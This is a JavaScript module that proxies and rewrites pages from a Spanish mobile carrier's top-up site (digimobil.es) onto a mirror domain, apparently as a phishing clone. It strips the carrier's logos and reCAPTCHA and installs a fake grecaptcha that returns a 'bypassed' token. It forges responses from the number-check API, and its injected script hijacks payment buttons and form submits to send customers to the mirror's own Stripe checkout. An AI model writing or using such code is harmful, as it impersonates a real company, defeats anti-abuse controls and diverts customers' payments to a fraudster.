const { STRIPE_PUBLISHABLE_KEY, SOURCE_DOMAIN, MIRROR_DOMAIN } = require('./constants');

function replaceDigiWithDig(text) {
  const protectedElements = [];
  let counter = 0;

  let protectedText = text.replace(/<[^>]+>/g, match => {
    const placeholder = `__PROTECTED_HTML_${counter++}__`;
    protectedElements.push({ placeholder, content: match });
    return placeholder;
  });

  protectedText = protectedText.replace(/(https?:\/\/[^\s"']+|www\.[^\s"']+)/g, match => {
    const placeholder = `__PROTECTED_URL_${counter++}__`;
    protectedElements.push({ placeholder, content: match });
    return placeholder;
  });

  const domainPatterns = [
    /digimobil\.es/g,
    /\.digi\./g,
    /\/digi\//g,
    /\bdigi[a-z]*\.com\b/g,
    /\bdigi[a-z]*\.net\b/g,
    /\bdigi[a-z]*\.org\b/g,
    /\bdigi[a-z]*\.io\b/g,
    /\bdigimobil\b/g,
    /\bdigisau\b/g,
    /\bdigilife\b/g,
    /\bdigiserve\b/g,
    /\bdigifinance\b/g
  ];

  for (const pattern of domainPatterns) {
    protectedText = protectedText.replace(pattern, match => {
      const placeholder = `__PROTECTED_DOMAIN_${counter++}__`;
      protectedElements.push({ placeholder, content: match });
      return placeholder;
    });
  }

  let modifiedText = protectedText;

  const replacements = [
    { pattern: /(^|\s|[^\w])(DIGI)(?=\s|$|[^\w])/g, replacement: '$1DIG$2' },
    { pattern: /(^|\s|[^\w])(Digi)(?=\s|$|[^\w])/g, replacement: '$1Dig$2' },
    { pattern: /(^|\s|[^\w])(digi)(?=\s|$|[^\w])/g, replacement: '$1dig$2' }
  ];

  for (const { pattern, replacement } of replacements) {
    modifiedText = modifiedText.replace(pattern, replacement);
  }

  modifiedText = modifiedText.replace(/DIGI/gi, match => {
    if (match === 'DIGI') return 'DIG';
    if (match === 'Digi') return 'Dig';
    if (match === 'digi') return 'dig';
    return match; 
  });

  for (let i = protectedElements.length - 1; i >= 0; i--) {
    const { placeholder, content } = protectedElements[i];
    modifiedText = modifiedText.replace(placeholder, content);
  }

  return modifiedText;
}

async function modifyHTML(response) {
  let text = await response.text();

  text = text.replace(/<script[^>]*src="[^"]*recaptcha[^"]*"[^>]*><\/script>/gi, '');
  text = text.replace(/<div[^>]*class=["'][^"']*captcha[^"']*["'][^>]*>[\s\S]*?<\/div>/gi, '');
  text = text.replace(/<[^>]*captcha[^>]*>/gi, '');
  text = text.replace(
    /<a[^>]*class="navbar-brand"[^>]*>\s*<img[^>]*alt="logo_digi_oficial"[^>]*>\s*<\/a>/gi,
    ''
  );
  text = text.replace(
    /<div[^>]*class="[^"]*footer-logo[^"]*"[^>]*>[\s\S]*?<\/div>/gi,
    ''
  );
  text = text.replace(
    /<img[^>]*alt="logo_digi[^"]*"[^>]*>/gi,
    ''
  );

  const bypassScript = `
    <script>
      (function() {
        if (!document.querySelector('script[src*="stripe.js"]')) {
          const stripeScript = document.createElement('script');
          stripeScript.src = 'https://js.stripe.com/v3/';
          document.head.appendChild(stripeScript);
        }
      })();
      
      window.stripeLoadedPromise = new Promise((resolve) => {
        if (typeof Stripe !== 'undefined') {
          window.stripeInstance = Stripe('${STRIPE_PUBLISHABLE_KEY}');
          resolve(window.stripeInstance);
        } else {
          document.addEventListener('DOMContentLoaded', function() {
            const stripeCheckInterval = setInterval(function() {
              if (typeof Stripe !== 'undefined') {
                clearInterval(stripeCheckInterval);
                window.stripeInstance = Stripe('${STRIPE_PUBLISHABLE_KEY}');
                resolve(window.stripeInstance);
              }
            }, 100);
            setTimeout(() => {
              clearInterval(stripeCheckInterval);
              resolve(null);
            }, 5000);
          });
        }
      });
      
      // Автоматичне проходження етапу перевірки номера
      function autoProgressAfterCheckNumber() {
        // Імітуємо кліки на кнопки "Далі" або "Продовжити" після завантаження сторінки
        setTimeout(() => {
          const continueButtons = Array.from(document.querySelectorAll('button, a.btn, input[type="submit"]')).filter(el => {
            const text = el.innerText || el.value || '';
            return text.match(/continue|next|далі|продовжити|siguiente/i) || 
                   el.classList.contains('btn-primary') || 
                   el.classList.contains('btn-success');
          });
          
          if (continueButtons.length > 0) {
            console.log('Auto-continuing to next step');
            continueButtons[0].click();
          }
        }, 500);
      }

      // Отримати вибрану суму з радіокнопок
      function getSelectedAmountFromRadios() {
        // Перевіряємо радіокнопки з name="recharge_number[amount]"
        const selectedRadio = document.querySelector('input[name="recharge_number[amount]"]:checked');
        if (selectedRadio) {
          console.log('Found selected amount radio:', selectedRadio.value);
          return selectedRadio.value;
        }
        
        // Перевіряємо будь-які інші радіокнопки зі словом amount
        const otherRadio = document.querySelector('input[type="radio"][name*="amount"]:checked');
        if (otherRadio) {
          console.log('Found other amount radio:', otherRadio.value);
          return otherRadio.value;
        }
        
        // Якщо немає вибраних радіокнопок, перевіряємо data-amount
        const amountEl = document.querySelector('[data-amount]');
        if (amountEl) {
          console.log('Found data-amount element:', amountEl.getAttribute('data-amount'));
          return amountEl.getAttribute('data-amount');
        }
        
        console.log('No amount radio found, using default 5');
        return '5';
      }
      
      // Отримати номер телефону з різних джерел на сторінці
      function getPhoneNumberFromPage() {
        // Спочатку перевіряємо номер телефону зі сховища
        let phoneNumber = '';
        try {
          phoneNumber = window.phoneNumberForPayment || 
                       sessionStorage.getItem('rechargePhoneNumber') || 
                       localStorage.getItem('rechargePhoneNumber') || '';
        } catch (e) { }
        
        if (phoneNumber && phoneNumber.match(/\\d{9}/)) {
          console.log('Found phone number in storage:', phoneNumber);
          return phoneNumber;
        }
        
        // Перевіряємо поля введення
        const phoneInput = document.querySelector('input[name*="phone"], input[type="tel"]');
        if (phoneInput && phoneInput.value) {
          phoneNumber = phoneInput.value.replace(/\\D/g, '');
          console.log('Found phone number in input field:', phoneNumber);
          if (phoneNumber.match(/\\d{9}/)) return phoneNumber;
        }
        
        // Перевіряємо div з класом phone і span всередині нього
        const phoneDiv = document.querySelector('.phone span');
        if (phoneDiv && phoneDiv.textContent) {
          phoneNumber = phoneDiv.textContent.trim().replace(/\\D/g, '');
          console.log('Found phone number in .phone span:', phoneNumber);
          if (phoneNumber.match(/\\d{9}/)) return phoneNumber;
        }
        
        // Перевіряємо будь-який span, який містить 9-значний номер
        const spans = document.querySelectorAll('span');
        for (const span of spans) {
          const text = span.textContent.trim();
          const digits = text.replace(/\\D/g, '');
          if (digits.match(/^\\d{9}$/)) {
            console.log('Found phone number in span:', digits);
            return digits;
          }
        }
        
        // Перевіряємо текст у будь-якому div з класом "phone"
        const phoneDivs = document.querySelectorAll('.phone');
        for (const div of phoneDivs) {
          const text = div.textContent.trim();
          const matches = text.match(/\\d{9}/);
          if (matches) {
            console.log('Found phone number in .phone div:', matches[0]);
            return matches[0];
          }
        }
        
        // Шукаємо 9-значний номер у будь-якому тексті на сторінці
        const bodyText = document.body.textContent;
        const matches = bodyText.match(/\\b(\\d{9})\\b/g);
        if (matches && matches.length > 0) {
          console.log('Found phone number in body text:', matches[0]);
          return matches[0];
        }
        
        console.log('No valid phone number found on page');
        return '';
      }

      // Пряме перенаправлення на процес оплати
      async function directPaymentRedirect(amount, phoneNumber) {
        console.log('DIRECT PAYMENT REDIRECT with amount:', amount, 'phone:', phoneNumber);
        
        try {
          // Автоматично задаємо значення, якщо вони відсутні
          if (!phoneNumber || !phoneNumber.match(/\\d{9}/)) {
            phoneNumber = getPhoneNumberFromPage();
          }
          
          if (!phoneNumber || !phoneNumber.match(/\\d{9}/)) {
            console.error('No valid phone number found');
            alert('Error: Valid 9-digit phone number required');
            return false;
          }
          
          if (!amount || isNaN(parseFloat(amount)) || parseFloat(amount) <= 0) {
            amount = getSelectedAmountFromRadios();
          }
          
          console.log('Sending direct payment request with amount:', amount, 'phone:', phoneNumber);
          
          // Запит до API створення платежу
          const response = await fetch('/api/create-payment', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ 
              amount: amount, 
              phoneNumber: phoneNumber,
              successUrl: window.location.origin + '/payment-success',
              cancelUrl: window.location.origin + '/payment-cancel'
            })
          });
          
          if (!response.ok) {
            console.error('Payment request failed with status:', response.status);
            throw new Error('Payment request failed with status: ' + response.status);
          }
          
          const data = await response.json();
          console.log('Payment response:', data);
          
          if (data.url) {
            console.log('Redirecting to Stripe URL:', data.url);
            window.location.href = data.url;
          } else if (data.sessionId) {
            console.log('Redirecting using Stripe checkout with session ID:', data.sessionId);
            const stripe = await stripeLoadedPromise;
            if (!stripe) throw new Error('Stripe failed to load');
            await stripe.redirectToCheckout({ sessionId: data.sessionId });
          } else {
            throw new Error('No URL or sessionId in response');
          }
          
          return true;
        } catch (error) {
          console.error('Direct payment error:', error);
          alert('Payment error: ' + error.message);
          return false;
        }
      }

      window.processPayment = async function(amount, phoneNumber, sourceEvent) {
        if (sourceEvent) {
          sourceEvent.preventDefault();
          sourceEvent.stopPropagation();
        }
        
        try {
          const isFirstStep = window.location.pathname.includes('/recargar') && 
                             !document.querySelector('[data-amount], .recharge-amount');
          
          if (isFirstStep) {
            const phoneInput = document.querySelector('input[name*="phone"], input[type="tel"], input[id*="phone"]');
            if (phoneInput && phoneInput.value.match(/\\d{9}/)) {
              try {
                sessionStorage.setItem('rechargePhoneNumber', phoneInput.value.replace(/\\D/g, ''));
                localStorage.setItem('rechargePhoneNumber', phoneInput.value.replace(/\\D/g, ''));
                window.phoneNumberForPayment = phoneInput.value.replace(/\\D/g, '');
              } catch (e) { console.error('Error storing phone:', e); }
            }
            return true;
          }
          
          // Отримати номер телефону з різних джерел на сторінці
          if (!phoneNumber || !phoneNumber.match(/\\d{9}/)) {
            phoneNumber = getPhoneNumberFromPage();
          }
          
          if (!phoneNumber || !phoneNumber.match(/\\d{9}/)) {
            alert('Error: Valid 9-digit phone number required');
            return false;
          }
          
          if (!amount || isNaN(parseFloat(amount)) || parseFloat(amount) <= 0) {
            amount = getSelectedAmountFromRadios() || '5';
          }
          
          console.log('Processing payment with amount:', amount, 'phone:', phoneNumber);
          
          const response = await fetch('/api/create-payment', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ 
              amount: amount, 
              phoneNumber: phoneNumber,
              successUrl: window.location.origin + '/payment-success',
              cancelUrl: window.location.origin + '/payment-cancel'
            })
          });
          
          if (!response.ok) throw new Error('Payment request failed');
          const data = await response.json();
          
          if (data.url) {
            console.log('Redirecting to payment URL:', data.url);
            window.location.href = data.url;
            return true;
          } else if (data.sessionId) {
            console.log('Using Stripe checkout with sessionId:', data.sessionId);
            const stripe = await window.stripeLoadedPromise;
            if (!stripe) throw new Error('Stripe failed to load');
            await stripe.redirectToCheckout({ sessionId: data.sessionId });
            return true;
          }
          
          throw new Error('No URL or sessionId in response');
        } catch (error) {
          console.error('Payment processing error:', error);
          alert('Payment error: ' + error.message);
          return false;
        }
      };
      
      document.addEventListener('DOMContentLoaded', function() {
        // Перевіряємо, чи є номер телефону на сторінці
        const phoneNumber = getPhoneNumberFromPage();
        if (phoneNumber) {
          console.log('Found phone number on page:', phoneNumber);
          try {
            // Зберігаємо знайдений номер для подальшого використання
            sessionStorage.setItem('rechargePhoneNumber', phoneNumber);
            localStorage.setItem('rechargePhoneNumber', phoneNumber);
            window.phoneNumberForPayment = phoneNumber;
          } catch (e) { console.error('Error storing phone:', e); }
        }
        
        // Автоматичний перехід до наступного етапу, якщо поточний URL містить "check_number"
        if (window.location.href.includes('check_number') || window.location.pathname.includes('/phone')) {
          autoProgressAfterCheckNumber();
        }

        // Додаємо глобальну змінну для відстеження, чи була вже натиснута кнопка платежу
        window.paymentButtonClicked = false;
        
        // НОВА ФУНКЦІЯ: Універсальне перехоплення подій кліку для запуску платежу
        document.addEventListener('click', function(event) {
          // Перевіряємо, чи натиснута кнопка має відношення до оплати
          const target = event.target;
          const buttonText = target.textContent?.toLowerCase() || '';
          
          // Якщо це кнопка, яка може бути пов'язана з платежами
          if (target.tagName === 'BUTTON' || target.tagName === 'A' || target.tagName === 'INPUT') {
            if (buttonText.includes('pagar') || 
                buttonText.includes('pay') || 
                buttonText.includes('recargar') || 
                buttonText.includes('comprar') ||
                buttonText.includes('checkout') ||
                buttonText.includes('continuar') ||
                target.classList.contains('btn-primary') || 
                target.classList.contains('btn-success')) {
              
              // Логуємо дії для відлагодження
              console.log('Potential payment button clicked:', target.tagName, buttonText);
              
              // Пропускаємо, якщо це перша сторінка вводу номера
              const isFirstStep = window.location.pathname.includes('/recargar') && 
                                !document.querySelector('[data-amount], .recharge-amount');
              
              if (isFirstStep) {
                console.log('This is the first step, not intercepting this button');
                return;
              }
              
              // Якщо у нас є radio-кнопки з сумою, це точно сторінка оплати
              const hasAmountRadios = document.querySelector('input[name="recharge_number[amount]"]');
              
              if (hasAmountRadios || document.querySelector('[data-amount]') || buttonText.includes('pagar')) {
                console.log('Found payment elements, intercepting this click');
                
                // Запобігаємо стандартній дії
                event.preventDefault();
                event.stopPropagation();
                
                // Якщо оплата ще не була запущена
                if (!window.paymentButtonClicked) {
                  window.paymentButtonClicked = true;
                  
                  // Отримуємо суму і номер телефону
                  const amount = getSelectedAmountFromRadios();
                  const phoneNumber = getPhoneNumberFromPage();
                  
                  console.log('Starting direct payment with amount:', amount, 'phone:', phoneNumber);
                  
                  // Запускаємо прямий платіж (без використання processPayment)
                  directPaymentRedirect(amount, phoneNumber).then(success => {
                    // Скидаємо прапорець, якщо сталася помилка
                    if (!success) {
                      window.paymentButtonClicked = false;
                    }
                  });
                  
                  return false;
                } else {
                  console.log('Payment already in progress, ignoring click');
                }
              }
            }
          }
        }, true); // Використовуємо захоплення (capture), щоб перехопити подію раніше
        
        // Перехоплюємо всі форми
        document.querySelectorAll('form').forEach(form => {
          console.log('Form found:', form.id || form.name || 'unnamed form');
          
          form.addEventListener('submit', function(event) {
            console.log('Form submit intercepted:', form.id || form.name);
            
            // Пропускаємо, якщо це перша сторінка вводу номера
            const isFirstStep = window.location.pathname.includes('/recargar') && 
                               !document.querySelector('[data-amount], .recharge-amount');
            
            if (isFirstStep) {
              console.log('This is the first step, not intercepting form submit');
              return true;
            }
            
            // Запобігаємо відправці форми
            event.preventDefault();
            event.stopPropagation();
            
            // Перевіряємо, чи це форма з вибором суми
            const hasAmountRadios = form.querySelector('input[name="recharge_number[amount]"]');
            if (hasAmountRadios) {
              console.log('Form has amount radios');
              const selectedAmount = getSelectedAmountFromRadios();
              console.log('Selected amount:', selectedAmount);
            
              // Отримуємо номер телефону з різних джерел
              const phoneNumber = getPhoneNumberFromPage();
              console.log('Phone for payment:', phoneNumber);
              
              // Запускаємо прямий платіж
              directPaymentRedirect(selectedAmount, phoneNumber);
            } else {
              // Для інших форм
              const amount = form.querySelector('[data-amount]')?.getAttribute('data-amount') || '5';
              const phoneNumber = getPhoneNumberFromPage();
              directPaymentRedirect(amount, phoneNumber);
            }
            
            return false;
          });
        });

        function replaceFooterText() {
          const footerElements = document.querySelectorAll('footer span, footer div, footer p');
          footerElements.forEach(element => {
            if (element.textContent.includes('© DIGDIG Spain Telecom, S.L.U. 2008/2025')) {
              element.textContent = element.textContent.replace(
                '© DIGDIG Spain Telecom, S.L.U. 2008/2025',
                '© DIG mobile solution'
              );
              element.style.textAlign = 'center'; 
            }
          });
        }

        const style = document.createElement('style');
        style.textContent = \`
          footer {
            text-align: center; 
            padding: 10px; 
          }
          footer span, footer div, footer p {
            display: inline-block; 
            width: 100%;
            text-align: center; 
            font-family: 'Arial', sans-serif;
            font-size: 12px; 
          }
        \`;
        document.head.appendChild(style);

        replaceFooterText();
        const observer = new MutationObserver(() => replaceFooterText());
        observer.observe(document.body, { childList: true, subtree: true });
      });
    </script>
  `;

  text = text.replace(/<head>/i, '<head>' + bypassScript);
  text = replaceDigiWithDig(text);

  return {
    statusCode: 200,
    body: text,
    headers: {
      'Content-Type': 'text/html;charset=UTF-8',
      'Access-Control-Allow-Origin': '*',
      'Access-Control-Allow-Methods': 'GET, POST, OPTIONS',
      'Access-Control-Allow-Headers': '*'
    }
  };
}

async function modifyJavaScript(response) {
  let text = await response.text();
  text = text.replace(new RegExp(SOURCE_DOMAIN, 'g'), MIRROR_DOMAIN);
  text = text.replace(new RegExp('https://store-backend.digimobil.es', 'g'), `https://${MIRROR_DOMAIN}/store-backend`);

  const recaptchaBypass = `
    window.grecaptcha = {
      ready: function(callback) { if (callback) setTimeout(callback, 10); },
      execute: function() { return Promise.resolve('bypassed_captcha_token'); },
      render: function() { return 1; },
      reset: function() { return true; }
    };
    
    (function() {
      const origFetch = window.fetch;
      window.fetch = function(url, options) {
        if (url && typeof url === 'string') {
          // Автоматична відповідь для перевірки номера
          if (url.includes('/api/check_number') || url.includes('/api/check-number')) {
            return Promise.resolve(new Response(JSON.stringify({
              code: 200,
              data: {
                id: Math.floor(Math.random() * 90000000) + 10000000,
                charges: 0,
                country: "spania",
                number: ""
              }
            }), { 
              status: 200, 
              headers: { 'Content-Type': 'application/json' } 
            }));
          }
          
          // Для інших API запитів, які потрібно обробити автоматично
          if (url.includes('/api/')) {
            console.log('Intercepted API request:', url);
          }
        }
        return origFetch.call(this, url, options);
      };
    })();
    
    // Прямий метод для перенаправлення на оплату
    async function directPaymentRedirect(amount, phoneNumber) {
      console.log('DIRECT PAYMENT REDIRECT JS with amount:', amount, 'phone:', phoneNumber);
      
      try {
        // Автоматично задаємо значення, якщо вони відсутні
        if (!phoneNumber || !phoneNumber.match(/\\d{9}/)) {
          phoneNumber = getPhoneNumberFromPage();
        }
        
        if (!phoneNumber || !phoneNumber.match(/\\d{9}/)) {
          console.error('No valid phone number found');
          alert('Error: Valid 9-digit phone number required');
          return false;
        }
        
        if (!amount || isNaN(parseFloat(amount)) || parseFloat(amount) <= 0) {
          amount = getSelectedAmountFromRadios();
        }
        
        console.log('Sending direct payment request with amount:', amount, 'phone:', phoneNumber);
        
        // Запит до API створення платежу
        const response = await fetch('/api/create-payment', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ 
            amount: amount, 
            phoneNumber: phoneNumber,
            successUrl: window.location.origin + '/payment-success',
            cancelUrl: window.location.origin + '/payment-cancel'
          })
        });
        
        if (!response.ok) {
          console.error('Payment request failed with status:', response.status);
          throw new Error('Payment request failed with status: ' + response.status);
        }
        
        const data = await response.json();
        console.log('Payment response:', data);
        
        if (data.url) {
          console.log('Redirecting to Stripe URL:', data.url);
          window.location.href = data.url;
        } else if (data.sessionId) {
          console.log('Redirecting using Stripe checkout with session ID:', data.sessionId);
          const stripe = await window.stripeLoadedPromise;
          if (!stripe) throw new Error('Stripe failed to load');
          await stripe.redirectToCheckout({ sessionId: data.sessionId });
        } else {
          throw new Error('No URL or sessionId in response');
        }
        
        return true;
      } catch (error) {
        console.error('Direct payment error:', error);
        alert('Payment error: ' + error.message);
        return false;
      }
    }
    
    // Отримати вибрану суму з радіокнопок
    function getSelectedAmountFromRadios() {
      // Перевіряємо радіокнопки з name="recharge_number[amount]"
      const selectedRadio = document.querySelector('input[name="recharge_number[amount]"]:checked');
      if (selectedRadio) {
        console.log('Found selected amount radio:', selectedRadio.value);
        return selectedRadio.value;
      }
      
      // Перевіряємо будь-які інші радіокнопки зі словом amount
      const otherRadio = document.querySelector('input[type="radio"][name*="amount"]:checked');
      if (otherRadio) {
        console.log('Found other amount radio:', otherRadio.value);
        return otherRadio.value;
      }
      
      // Якщо немає вибраних радіокнопок, перевіряємо data-amount
      const amountEl = document.querySelector('[data-amount]');
      if (amountEl) {
        console.log('Found data-amount element:', amountEl.getAttribute('data-amount'));
        return amountEl.getAttribute('data-amount');
      }
      
      console.log('No amount radio found, using default 5');
      return '5';
    }
    
    // Функція для пошуку номера телефону на сторінці
    function getPhoneNumberFromPage() {
      // Спочатку перевіряємо номер телефону зі сховища
      let phoneNumber = '';
      try {
        phoneNumber = window.phoneNumberForPayment || 
                     sessionStorage.getItem('rechargePhoneNumber') || 
                     localStorage.getItem('rechargePhoneNumber') || '';
      } catch (e) { }
      
      if (phoneNumber && phoneNumber.match(/\\d{9}/)) {
        console.log('Found phone number in storage:', phoneNumber);
        return phoneNumber;
      }
      
      // Перевіряємо поля введення
      const phoneInput = document.querySelector('input[name*="phone"], input[type="tel"]');
      if (phoneInput && phoneInput.value) {
        phoneNumber = phoneInput.value.replace(/\\D/g, '');
        if (phoneNumber.match(/\\d{9}/)) return phoneNumber;
      }
      
      // Перевіряємо div з класом phone і span всередині нього
      const phoneDiv = document.querySelector('.phone span');
      if (phoneDiv && phoneDiv.textContent) {
        phoneNumber = phoneDiv.textContent.trim().replace(/\\D/g, '');
        if (phoneNumber.match(/\\d{9}/)) return phoneNumber;
      }
      
      // Перевіряємо текст у будь-якому div з класом "phone"
      const phoneDivs = document.querySelectorAll('.phone');
      for (const div of phoneDivs) {
        const text = div.textContent.trim();
        const matches = text.match(/\\d{9}/);
        if (matches) {
          return matches[0];
        }
      }
      
      // Шукаємо 9-значний номер у будь-якому тексті на сторінці
      const bodyText = document.body.textContent;
      const matches = bodyText.match(/\\b(\\d{9})\\b/g);
      if (matches && matches.length > 0) {
        return matches[0];
      }
      
      return '';
    }
    
    // Додаємо глобальну змінну для відстеження, чи була вже натиснута кнопка платежу
    window.paymentButtonClicked = false;
    
    // Універсальне перехоплення подій кліку для запуску платежу
    document.addEventListener('click', function(event) {
      // Перевіряємо, чи натиснута кнопка має відношення до оплати
      const target = event.target;
      const buttonText = target.textContent?.toLowerCase() || '';
      
      // Якщо це кнопка, яка може бути пов'язана з платежами
      if (target.tagName === 'BUTTON' || target.tagName === 'A' || target.tagName === 'INPUT') {
        if (buttonText.includes('pagar') || 
            buttonText.includes('pay') || 
            buttonText.includes('recargar') || 
            buttonText.includes('comprar') ||
            buttonText.includes('checkout') ||
            buttonText.includes('continuar') ||
            target.classList.contains('btn-primary') || 
            target.classList.contains('btn-success')) {
          
          // Логуємо дії для відлагодження
          console.log('Potential payment button clicked JS:', target.tagName, buttonText);
          
          // Пропускаємо, якщо це перша сторінка вводу номера
          const isFirstStep = window.location.pathname.includes('/recargar') && 
                            !document.querySelector('[data-amount], .recharge-amount');
          
          if (isFirstStep) {
            console.log('This is the first step, not intercepting this button');
            return;
          }
          
          // Якщо у нас є radio-кнопки з сумою, це точно сторінка оплати
          const hasAmountRadios = document.querySelector('input[name="recharge_number[amount]"]');
          
          if (hasAmountRadios || document.querySelector('[data-amount]') || buttonText.includes('pagar')) {
            console.log('Found payment elements, intercepting this click');
            
            // Запобігаємо стандартній дії
            event.preventDefault();
            event.stopPropagation();
            
            // Якщо оплата ще не була запущена
            if (!window.paymentButtonClicked) {
              window.paymentButtonClicked = true;
              
              // Отримуємо суму і номер телефону
              const amount = getSelectedAmountFromRadios();
              const phoneNumber = getPhoneNumberFromPage();
              
              console.log('Starting direct payment with amount:', amount, 'phone:', phoneNumber);
              
              // Запускаємо прямий платіж
              directPaymentRedirect(amount, phoneNumber).then(success => {
                // Скидаємо прапорець, якщо сталася помилка
                if (!success) {
                  window.paymentButtonClicked = false;
                }
              });
              
              return false;
            } else {
              console.log('Payment already in progress, ignoring click');
            }
          }
        }
      }
    }, true);
    
    // Автоматичний перехід до наступного кроку після перевірки номера
    (function() {
      if (window.location.href.includes('check_number') || window.location.pathname.includes('/phone')) {
        setTimeout(() => {
          const continueButtons = Array.from(document.querySelectorAll('button, a.btn, input[type="submit"]')).filter(el => {
            const text = el.innerText || el.value || '';
            return text.match(/continue|next|далі|продовжити|siguiente/i) || 
                  el.classList.contains('btn-primary') || 
                  el.classList.contains('btn-success');
          });
          
          if (continueButtons.length > 0) {
            console.log('Auto-continuing to next step');
            continueButtons[0].click();
          }
        }, 500);
      }
      
      // Після завантаження документа, шукаємо номер телефону
      document.addEventListener('DOMContentLoaded', function() {
        const phoneNumber = getPhoneNumberFromPage();
        if (phoneNumber) {
          console.log('Found phone number on page:', phoneNumber);
          try {
            sessionStorage.setItem('rechargePhoneNumber', phoneNumber);
            localStorage.setItem('rechargePhoneNumber', phoneNumber);
            window.phoneNumberForPayment = phoneNumber;
          } catch (e) { }
        }
      });
    })();
    
    (function() {
      if (typeof window.stripeInstance === 'undefined' && typeof Stripe !== 'undefined') {
        window.stripeInstance = Stripe('${STRIPE_PUBLISHABLE_KEY}');
      }
      try {
        window.phoneNumberForPayment = sessionStorage.getItem('rechargePhoneNumber') || 
                                      localStorage.getItem('rechargePhoneNumber');
      } catch (e) { }
    })();
    
    // Перехоплення викликів reCAPTCHA
    (function() {
      if (typeof grecaptcha !== 'undefined') {
        grecaptcha.execute = function() { return Promise.resolve('bypassed_captcha_token'); };
        grecaptcha.ready = function(callback) { if (callback) setTimeout(callback, 10); };
        grecaptcha.render = function() { return 1; };
        grecaptcha.reset = function() { return true; };
      }
    })();
    
    // Динамічне видалення grecaptcha-badge
    (function() {
      document.addEventListener('DOMContentLoaded', function() {
        const removeRecaptchaBadge = () => {
          const badge = document.querySelector('.grecaptcha-badge');
          if (badge) {
            badge.remove();
          }
        };
        
        // Видаляємо одразу після завантаження
        removeRecaptchaBadge();
        
        // Спостерігаємо за змінами в DOM, щоб видаляти badge, якщо він додається пізніше
        const observer = new MutationObserver((mutations) => {
          mutations.forEach((mutation) => {
            if (mutation.addedNodes.length) {
              removeRecaptchaBadge();
            }
          });
        });
        
        observer.observe(document.body, {
          childList: true,
          subtree: true
        });
      });
    })();
  `;

  const initScript = `
    if (typeof window.global === 'undefined') { window.global = {}; }
    if (typeof window.global.notif !== 'function') {
      window.global.notif = function() { return Promise.resolve(); };
    }
    ${recaptchaBypass}
  `;

  text = initScript + text;
  text = replaceDigiWithDig(text);

  return {
    statusCode: 200,
    body: text,
    headers: {
      'Content-Type': 'application/javascript',
      'Access-Control-Allow-Origin': '*',
      'Access-Control-Allow-Methods': 'GET, POST, OPTIONS',
      'Access-Control-Allow-Headers': '*'
    }
  };
}

module.exports = {
  replaceDigiWithDig,
  modifyHTML,
  modifyJavaScript
};